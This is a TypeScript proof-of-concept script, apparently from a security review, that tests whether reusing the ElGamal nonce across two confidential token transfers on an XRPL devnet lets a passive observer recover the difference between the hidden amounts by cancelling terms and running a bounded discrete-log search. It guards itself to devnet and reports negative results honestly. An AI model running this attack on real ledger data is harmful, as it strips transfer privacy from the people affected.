#!/usr/bin/env bun
/**
 * OBSERVER SIDE. Holds no keys. Links no mpt-crypto.
 *
 *   bun tools/spike-randomness-2026-08-18/reuse-r-attack.ts <txHashA> <txHashB>
 *
 * Takes two ConfidentialMPTSend transaction hashes and nothing else — no
 * secret, no seed, no WASM module, no vendored C library. Exactly what a
 * passive full-ledger observer has.
 *
 * ## The claim under test
 *
 * Issue #3, from REVIEW-005a §5.2 / REVIEW-005b §5.7, adjudicated REVIEW-005c §6:
 *
 *   "Repeated r across two Sends: C1 = r*G repeats on chain, so any observer
 *    computes C2,i - C2',i = (m - m')*G and recovers amount DIFFERENCES by the
 *    same bounded DLP search the library already implements."
 *
 * ## Why it works, if it works
 *
 * EC-ElGamal here is C1 = r*G, C2_i = m*G + r*pk_i. Hold r fixed across two
 * sends and the r*pk_i term is identical in both, so subtracting the two C2
 * values annihilates it:
 *
 *   C2_i - C2'_i = (m*G + r*pk_i) - (m'*G + r*pk_i) = (m - m')*G
 *
 * The result is a bare multiple of the generator. Recovering m - m' is then a
 * small-range discrete log, which is the same bounded search the library ships
 * for its own decryption — hence "no cryptographic work".
 *
 * Note what this does NOT need: neither participant's secret key, and not r
 * itself. r is never published for a Send. Only C1 = r*G is, and C1 is used
 * here only as the DETECTOR that the same r was reused — it is not an input to
 * the recovery.
 *
 * ## What a null result would mean
 *
 * If C1 does not repeat, or the difference does not resolve, that is reported
 * as a refutation rather than massaged. A negative control that fails to fire
 * is a finding about the claim, not a failure of the harness.
 */
import { secp256k1 } from "@noble/curves/secp256k1";

const DEVNET_WS = "wss://s.devnet.rippletest.net:51233";
const DEVNET_NETWORK_ID = 2;

const [hashA, hashB] = process.argv.slice(2);
if (!hashA || !hashB) {
  console.error("usage: reuse-r-attack.ts <txHashA> <txHashB>");
  process.exit(2);
}

// --- minimal RPC, read-only ------------------------------------------------
let ws: WebSocket;
let idc = 0;
const pending = new Map<number, (v: any) => void>();
const rpc = (cmd: Record<string, unknown>): Promise<any> =>
  new Promise((res) => {
    const id = ++idc;
    pending.set(id, res);
    ws.send(JSON.stringify({ id, ...cmd }));
  });

await new Promise<void>((resolve, reject) => {
  ws = new WebSocket(DEVNET_WS);
  ws.onopen = () => resolve();
  ws.onerror = (e) => reject(e);
  ws.onmessage = (m) => {
    const d = JSON.parse(m.data as string);
    const cb = pending.get(d.id);
    if (cb) { pending.delete(d.id); cb(d); }
  };
});

const info = await rpc({ command: "server_info" });
const netId = info.result?.info?.network_id;
if (netId !== DEVNET_NETWORK_ID) {
  console.error(`refusing: network_id ${netId}, expected ${DEVNET_NETWORK_ID}`);
  ws.close();
  process.exit(1);
}
console.log(`observer connected — network_id ${netId}, rippled ${info.result.info.build_version}`);
console.log("holding: no keys, no mpt-crypto. only @noble/curves.\n");

// --- pull the two transactions, as anyone can ------------------------------
async function getSend(h: string) {
  const t = await rpc({ command: "tx", transaction: h });
  const j = t.result?.tx_json ?? t.result;
  if (!j || j.TransactionType !== "ConfidentialMPTSend")
    throw new Error(`${h} is not a ConfidentialMPTSend`);
  return {
    hash: h,
    account: j.Account,
    destination: j.Destination,
    sender: j.SenderEncryptedAmount as string,
    dest: j.DestinationEncryptedAmount as string,
    issuer: j.IssuerEncryptedAmount as string,
    validated: t.result?.validated,
  };
}

const A = await getSend(hashA);
const B = await getSend(hashB);

console.log(`tx A ${A.hash}\n  ${A.account} -> ${A.destination}`);
console.log(`tx B ${B.hash}\n  ${B.account} -> ${B.destination}\n`);

// A 66-byte ElGamal pair on the wire is C1(33) || C2(33).
const C1 = (ct: string) => ct.slice(0, 66);
const C2 = (ct: string) => ct.slice(66, 132);

// --- step 1: the detector --------------------------------------------------
const fields = [
  ["SenderEncryptedAmount", A.sender, B.sender],
  ["DestinationEncryptedAmount", A.dest, B.dest],
  ["IssuerEncryptedAmount", A.issuer, B.issuer],
] as const;

console.log("step 1 — does C1 repeat? (this is the tell, visible to anyone)");
let reused = false;
for (const [name, a, b] of fields) {
  const same = C1(a) === C1(b);
  reused ||= same;
  console.log(`  ${same ? "REUSED " : "distinct"}  ${name}  C1=${C1(a).slice(0, 24)}...`);
}

if (!reused) {
  console.log("\nRESULT: C1 does not repeat across these two transactions.");
  console.log("The claim's precondition is absent, so nothing is recoverable this way.");
  console.log("This is a refutation of the precondition, not of the mechanism.");
  ws.close();
  process.exit(0);
}

// --- step 2: annihilate the shared term ------------------------------------
console.log("\nstep 2 — subtract the two C2 values; the r*pk_i term cancels");

function pointDiff(c2a: string, c2b: string) {
  const P = secp256k1.ProjectivePoint.fromHex(c2a);
  const Q = secp256k1.ProjectivePoint.fromHex(c2b);
  return P.subtract(Q);
}

// --- step 3: bounded discrete log on (m - m')*G ----------------------------
// The same search the library ships for decryption. Range is deliberately
// small: an observer who knows the asset knows roughly what amounts look like.
const RANGE = 100_000;
function bruteForce(target: any): number | null {
  if (target.equals(secp256k1.ProjectivePoint.ZERO)) return 0;
  let acc = secp256k1.ProjectivePoint.ZERO;
  const G = secp256k1.ProjectivePoint.BASE;
  for (let d = 1; d <= RANGE; d++) {
    acc = acc.add(G);
    if (acc.equals(target)) return d;
    if (acc.equals(target.negate())) return -d;
  }
  return null;
}

console.log(`step 3 — bounded DLP over +/-${RANGE.toLocaleString()}, no keys involved\n`);

let recovered = false;
for (const [name, a, b] of fields) {
  if (C1(a) !== C1(b)) continue;
  const diff = pointDiff(C2(a), C2(b));
  const t0 = performance.now();
  const d = bruteForce(diff);
  const ms = (performance.now() - t0).toFixed(0);
  if (d === null) {
    console.log(`  ${name}: difference not in range (|m-m'| > ${RANGE})`);
  } else {
    recovered = true;
    console.log(`  ${name}: m - m' = ${d}   (recovered in ${ms} ms)`);
  }
}

console.log();
if (recovered) {
  console.log("RESULT: CONFIRMED. A passive observer holding no keys recovered the");
  console.log("difference between two confidential amounts, using only public ledger");
  console.log("data and a general-purpose curve library.");
  console.log();
  console.log("Scope, stated so this is not over-read: this recovers the DIFFERENCE");
  console.log("m - m', not either amount. It requires r to be reused across two sends,");
  console.log("which a correct signer never does. It is evidence for issue #3's");
  console.log("premise — that r's source is unowned and its failure mode is cheap —");
  console.log("not a break of XLS-96 as specified.");
} else {
  console.log("RESULT: C1 repeated, but no difference resolved within the search range.");
  console.log("Report as-is. Do not widen the range to manufacture a hit.");
}

ws.close();
